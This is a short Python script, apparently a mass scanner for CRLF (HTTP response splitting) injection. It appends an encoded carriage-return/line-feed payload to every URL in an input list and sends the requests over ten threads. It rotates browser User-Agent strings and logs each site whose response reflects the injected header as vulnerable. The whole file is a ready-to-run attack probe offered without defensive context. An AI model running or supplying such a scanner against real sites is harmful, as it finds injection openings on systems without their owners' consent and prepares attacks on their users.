import requests
import concurrent.futures
from urllib.parse import urlparse
import random

# Define the payload
payload = "%23%0d%0a2222:param=1111"

# List of User-Agent strings
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
]

# Read URLs from input.txt
with open('input.txt', 'r') as file:
    urls = [line.strip() for line in file.readlines()]

# Function to scan a single URL
def scan_url(url):
    try:
        # Rotate User-Agent string
        headers = {'User-Agent': random.choice(user_agents)}

        # Parse the URL to handle different formats properly
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        query = parsed_url.query
        test_url = f"{base_url}?{query}{payload}" if query else f"{base_url}?{payload}"

        # Send the request
        response = requests.get(test_url, headers=headers, allow_redirects=False, timeout=10)
        status_code = response.status_code

        # Check for the specific injected parameter in the 2222 header
        cookies = response.headers.get('2222', '')
        if cookies and 'param=1111' in cookies:
            result = f"[+] Vulnerable: {url} (Status Code: {status_code})"
        else:
            result = f"[-] Not Vulnerable: {url} (Status Code: {status_code})"

        print(result)
        with open('output.txt', 'a') as output_file:
            output_file.write(result + '\n')
    except requests.exceptions.RequestException as e:
        error_msg = f"[!] Error scanning {url}: {e}"
        print(error_msg)
        with open('output.txt', 'a') as output_file:
            output_file.write(error_msg + '\n')

# Use concurrent futures for faster scanning
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(scan_url, urls)

print("Scanning complete.")
